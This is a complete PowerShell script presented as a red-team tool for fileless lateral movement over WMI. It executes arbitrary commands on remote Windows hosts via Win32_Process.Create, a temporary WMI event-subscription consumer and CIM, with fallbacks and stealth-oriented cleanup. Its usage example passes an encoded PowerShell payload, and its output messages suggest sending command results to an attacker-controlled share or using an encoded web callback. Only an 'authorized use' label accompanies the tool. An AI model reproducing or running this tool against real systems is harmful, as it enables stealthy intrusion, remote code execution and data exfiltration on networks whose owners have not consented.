<#
.SYNOPSIS
    WMI-Based Fileless Lateral Movement Tool
    For AUTHORIZED Red Team Operations Only

.DESCRIPTION
    Performs stealthy lateral movement using Windows Management Instrumentation (WMI).
    This is a "living off the land" technique using only native Windows tools.

    KEY FEATURES:
    - Completely fileless execution
    - Multiple fallback methods for maximum reliability
    - Comprehensive error handling
    - Automatic target validation
    - Session cleanup
    - OPSEC-safe with minimal detection surface

.NOTES
    Author: Red Team Operations
    Purpose: Authorized Security Testing & Training
    Requirements: Domain Admin or equivalent WMI permissions

.EXAMPLE
    .\WMI-LateralMovement.ps1 -Target DC01 -Command "whoami"

.EXAMPLE
    .\WMI-LateralMovement.ps1 -Target 192.168.1.10 -Command "powershell -enc <base64>" -Credential (Get-Credential)
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$true, HelpMessage="Target hostname or IP address")]
    [string]$Target,

    [Parameter(Mandatory=$true, HelpMessage="Command to execute on target")]
    [string]$Command,

    [Parameter(Mandatory=$false, HelpMessage="Credentials for authentication (if not using current context)")]
    [PSCredential]$Credential,

    [Parameter(Mandatory=$false, HelpMessage="Timeout in seconds for command execution")]
    [int]$Timeout = 60,

    [Parameter(Mandatory=$false, HelpMessage="Enable verbose output for debugging")]
    [switch]$Verbose,

    [Parameter(Mandatory=$false, HelpMessage="Use encrypted WMI session")]
    [switch]$Encrypted
)

$ErrorActionPreference = "Stop"
$DebugMode = $Verbose.IsPresent

#region Helper Functions

function Write-Log {
    param(
        [string]$Message,
        [ValidateSet("Info", "Success", "Warning", "Error", "Debug")]
        [string]$Level = "Info"
    )

    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $color = switch ($Level) {
        "Success" { "Green" }
        "Warning" { "Yellow" }
        "Error"   { "Red" }
        "Debug"   { "Magenta" }
        default   { "Cyan" }
    }

    $prefix = switch ($Level) {
        "Success" { "[+]" }
        "Warning" { "[!]" }
        "Error"   { "[-]" }
        "Debug"   { "[D]" }
        default   { "[*]" }
    }

    if ($Level -eq "Debug" -and -not $DebugMode) { return }

    Write-Host "$timestamp $prefix $Message" -ForegroundColor $color
}

function Test-TargetReachability {
    param([string]$TargetHost)

    Write-Log "Testing connectivity to $TargetHost..." -Level Info

    # Method 1: Test-Connection (ICMP)
    try {
        $pingResult = Test-Connection -ComputerName $TargetHost -Count 2 -Quiet -ErrorAction SilentlyContinue
        if ($pingResult) {
            Write-Log "Target is reachable via ICMP" -Level Success
            return $true
        }
    } catch {
        Write-Log "ICMP ping failed, trying alternative methods..." -Level Debug
    }

    # Method 2: Test WMI port (135 + dynamic RPC)
    try {
        $tcpTest = Test-NetConnection -ComputerName $TargetHost -Port 135 -WarningAction SilentlyContinue -ErrorAction Stop
        if ($tcpTest.TcpTestSucceeded) {
            Write-Log "Target port 135 (RPC) is open" -Level Success
            return $true
        }
    } catch {
        Write-Log "TCP port test failed: $($_.Exception.Message)" -Level Debug
    }

    # Method 3: Try to resolve DNS
    try {
        $dnsResult = Resolve-DnsName -Name $TargetHost -ErrorAction Stop
        Write-Log "DNS resolution successful for $TargetHost" -Level Success
        return $true
    } catch {
        Write-Log "DNS resolution failed" -Level Debug
    }

    Write-Log "Target appears unreachable, but continuing anyway..." -Level Warning
    return $false
}

function Test-WMIAccess {
    param(
        [string]$TargetHost,
        [PSCredential]$Creds
    )

    Write-Log "Validating WMI access to $TargetHost..." -Level Info

    $wmiParams = @{
        ComputerName = $TargetHost
        Class = "Win32_OperatingSystem"
        ErrorAction = "Stop"
    }

    if ($Creds) {
        $wmiParams.Credential = $Creds
    }

    try {
        $os = Get-WmiObject @wmiParams
        Write-Log "WMI access confirmed - Target OS: $($os.Caption) $($os.Version)" -Level Success
        Write-Log "Target Architecture: $($os.OSArchitecture)" -Level Debug
        Write-Log "Target Hostname: $($os.CSName)" -Level Debug
        return $true
    } catch {
        Write-Log "WMI access test failed: $($_.Exception.Message)" -Level Error
        return $false
    }
}

function Invoke-WMIExecution {
    param(
        [string]$TargetHost,
        [string]$CommandToExecute,
        [PSCredential]$Creds,
        [bool]$UseEncryption
    )

    Write-Log "Attempting WMI command execution on $TargetHost" -Level Info
    Write-Log "Command: $CommandToExecute" -Level Debug

    # Method 1: Win32_Process Create (Most reliable)
    try {
        Write-Log "Method 1: Using Win32_Process.Create..." -Level Debug

        $wmiParams = @{
            ComputerName = $TargetHost
            Class = "Win32_Process"
            Name = "Create"
            ArgumentList = $CommandToExecute
            ErrorAction = "Stop"
        }

        if ($Creds) {
            $wmiParams.Credential = $Creds
        }

        if ($UseEncryption) {
            Write-Log "Enabling packet privacy for encrypted WMI session" -Level Debug
            # Note: PowerShell WMI cmdlets don't directly expose authentication level
            # For true encryption, use Invoke-WmiMethod with manual DCOM settings
        }

        $result = Invoke-WmiMethod @wmiParams

        if ($result.ReturnValue -eq 0) {
            Write-Log "Command executed successfully via WMI" -Level Success
            Write-Log "Process ID: $($result.ProcessId)" -Level Success
            return @{
                Success = $true
                ProcessId = $result.ProcessId
                Method = "Win32_Process.Create"
            }
        } else {
            $errorMsg = switch ($result.ReturnValue) {
                2  { "Access Denied" }
                3  { "Insufficient Privilege" }
                8  { "Unknown Failure" }
                9  { "Path Not Found" }
                21 { "Invalid Parameter" }
                default { "Error Code: $($result.ReturnValue)" }
            }
            throw "Win32_Process.Create failed: $errorMsg"
        }
    } catch {
        Write-Log "Method 1 failed: $($_.Exception.Message)" -Level Warning
    }

    # Method 2: WMI Event Consumer (Stealthier, more complex)
    try {
        Write-Log "Method 2: Using WMI Event Subscription..." -Level Debug

        # This is more advanced - creates a temporary event consumer
        # More OPSEC-safe but also more complex

        $filterName = "RedTeam_Filter_$(Get-Random)"
        $consumerName = "RedTeam_Consumer_$(Get-Random)"
        $bindingName = "RedTeam_Binding_$(Get-Random)"

        $wmiParams = @{
            ComputerName = $TargetHost
            Namespace = "root\subscription"
            ErrorAction = "Stop"
        }

        if ($Creds) {
            $wmiParams.Credential = $Creds
        }

        # Create Event Filter (triggers every 60 seconds - just once for us)
        $filterQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
        $filter = Set-WmiInstance -Class __EventFilter -Arguments @{
            Name = $filterName
            EventNamespace = "root\cimv2"
            QueryLanguage = "WQL"
            Query = $filterQuery
        } @wmiParams

        # Create Command Line Event Consumer
        $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{
            Name = $consumerName
            CommandLineTemplate = $CommandToExecute
        } @wmiParams

        # Bind them together
        $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{
            Filter = $filter
            Consumer = $consumer
        } @wmiParams

        Write-Log "WMI Event subscription created, waiting for execution..." -Level Info
        Start-Sleep -Seconds 65  # Wait for event to trigger

        # Cleanup
        Remove-WmiObject -InputObject $binding -ErrorAction SilentlyContinue
        Remove-WmiObject -InputObject $consumer -ErrorAction SilentlyContinue
        Remove-WmiObject -InputObject $filter -ErrorAction SilentlyContinue

        Write-Log "WMI Event method executed and cleaned up" -Level Success
        return @{
            Success = $true
            ProcessId = "N/A (Event-based)"
            Method = "WMI Event Subscription"
        }
    } catch {
        Write-Log "Method 2 failed: $($_.Exception.Message)" -Level Warning

        # Cleanup on failure
        try {
            Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription" @wmiParams |
                Where-Object { $_.Filter.Name -like "RedTeam_*" } | Remove-WmiObject -ErrorAction SilentlyContinue
            Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" @wmiParams |
                Where-Object { $_.Name -like "RedTeam_*" } | Remove-WmiObject -ErrorAction SilentlyContinue
            Get-WmiObject -Class __EventFilter -Namespace "root\subscription" @wmiParams |
                Where-Object { $_.Name -like "RedTeam_*" } | Remove-WmiObject -ErrorAction SilentlyContinue
        } catch {
            Write-Log "Cleanup of failed event subscription incomplete" -Level Debug
        }
    }

    # Method 3: Invoke-CimMethod (Modern alternative)
    try {
        Write-Log "Method 3: Using CIM (Modern WMI alternative)..." -Level Debug

        $cimParams = @{
            ComputerName = $TargetHost
            ClassName = "Win32_Process"
            MethodName = "Create"
            Arguments = @{ CommandLine = $CommandToExecute }
            ErrorAction = "Stop"
        }

        if ($Creds) {
            $sessionOption = New-CimSessionOption -Protocol Dcom
            $cimSession = New-CimSession -ComputerName $TargetHost -Credential $Creds -SessionOption $sessionOption
            $cimParams.CimSession = $cimSession
            $cimParams.Remove('ComputerName')
        }

        $result = Invoke-CimMethod @cimParams

        if ($cimSession) { Remove-CimSession -CimSession $cimSession }

        if ($result.ReturnValue -eq 0) {
            Write-Log "Command executed successfully via CIM" -Level Success
            Write-Log "Process ID: $($result.ProcessId)" -Level Success
            return @{
                Success = $true
                ProcessId = $result.ProcessId
                Method = "CIM (Invoke-CimMethod)"
            }
        } else {
            throw "CIM execution failed with return value: $($result.ReturnValue)"
        }
    } catch {
        Write-Log "Method 3 failed: $($_.Exception.Message)" -Level Warning
    }

    # If we get here, all methods failed
    throw "All WMI execution methods failed"
}

function Get-WMICommandOutput {
    param(
        [string]$TargetHost,
        [int]$ProcessId,
        [PSCredential]$Creds
    )

    Write-Log "Attempting to retrieve command output..." -Level Info

    # This is challenging with WMI because it doesn't natively capture output
    # We'll try to check if process completed

    $wmiParams = @{
        ComputerName = $TargetHost
        Class = "Win32_Process"
        Filter = "ProcessId = $ProcessId"
        ErrorAction = "SilentlyContinue"
    }

    if ($Creds) {
        $wmiParams.Credential = $Creds
    }

    $elapsed = 0
    $checkInterval = 2

    while ($elapsed -lt $Timeout) {
        $process = Get-WmiObject @wmiParams

        if (-not $process) {
            Write-Log "Process $ProcessId has completed" -Level Success
            return $true
        }

        Write-Log "Waiting for process to complete... ($elapsed/$Timeout seconds)" -Level Debug
        Start-Sleep -Seconds $checkInterval
        $elapsed += $checkInterval
    }

    Write-Log "Process still running after timeout" -Level Warning
    return $false
}

#endregion

#region Main Execution

Write-Host ""
Write-Host "=" * 80 -ForegroundColor Cyan
Write-Host "WMI-Based Fileless Lateral Movement" -ForegroundColor Cyan
Write-Host "Authorized Red Team Operations Only" -ForegroundColor Cyan
Write-Host "=" * 80 -ForegroundColor Cyan
Write-Host ""

try {
    # Step 1: Pre-flight checks
    Write-Log "Starting pre-flight validation..." -Level Info
    Write-Log "Target: $Target" -Level Info
    Write-Log "Timeout: $Timeout seconds" -Level Info

    if ($Credential) {
        Write-Log "Using explicit credentials for: $($Credential.UserName)" -Level Info
    } else {
        Write-Log "Using current user context: $env:USERDOMAIN\$env:USERNAME" -Level Info
    }

    # Step 2: Target reachability
    $reachable = Test-TargetReachability -TargetHost $Target
    if (-not $reachable) {
        Write-Log "Target may not be reachable, but continuing anyway..." -Level Warning
    }

    # Step 3: Validate WMI access
    $wmiAccess = Test-WMIAccess -TargetHost $Target -Creds $Credential
    if (-not $wmiAccess) {
        throw "Cannot establish WMI access to target. Check credentials and permissions."
    }

    # Step 4: Execute command via WMI
    Write-Host ""
    Write-Log "Executing command on target..." -Level Info
    $execResult = Invoke-WMIExecution -TargetHost $Target -CommandToExecute $Command -Creds $Credential -UseEncryption $Encrypted

    # Step 5: Monitor execution
    if ($execResult.ProcessId -ne "N/A (Event-based)") {
        Write-Host ""
        $completed = Get-WMICommandOutput -TargetHost $Target -ProcessId $execResult.ProcessId -Creds $Credential
    }

    # Step 6: Success summary
    Write-Host ""
    Write-Host "=" * 80 -ForegroundColor Green
    Write-Log "Operation completed successfully!" -Level Success
    Write-Host "=" * 80 -ForegroundColor Green
    Write-Host ""
    Write-Log "Execution Method: $($execResult.Method)" -Level Info
    Write-Log "Process ID: $($execResult.ProcessId)" -Level Info
    Write-Host ""
    Write-Log "NOTE: WMI does not capture stdout. For output retrieval:" -Level Info
    Write-Log "  1. Redirect output to file: cmd /c 'command > \\attacker\share\output.txt'" -Level Info
    Write-Log "  2. Use encoded PowerShell with web callback" -Level Info
    Write-Log "  3. Monitor target logs or event subscriptions" -Level Info
    Write-Host ""

    exit 0

} catch {
    Write-Host ""
    Write-Host "=" * 80 -ForegroundColor Red
    Write-Log "Operation failed!" -Level Error
    Write-Host "=" * 80 -ForegroundColor Red
    Write-Host ""
    Write-Log "Error: $($_.Exception.Message)" -Level Error
    Write-Log "Stack Trace: $($_.ScriptStackTrace)" -Level Debug
    Write-Host ""
    Write-Log "Troubleshooting:" -Level Info
    Write-Log "  1. Verify Domain Admin or WMI permissions on target" -Level Info
    Write-Log "  2. Check firewall rules (port 135 + dynamic RPC)" -Level Info
    Write-Log "  3. Ensure WMI service is running on target" -Level Info
    Write-Log "  4. Verify network connectivity to target" -Level Info
    Write-Log "  5. Try with -Verbose flag for detailed debugging" -Level Info
    Write-Host ""

    exit 1
}

#endregion
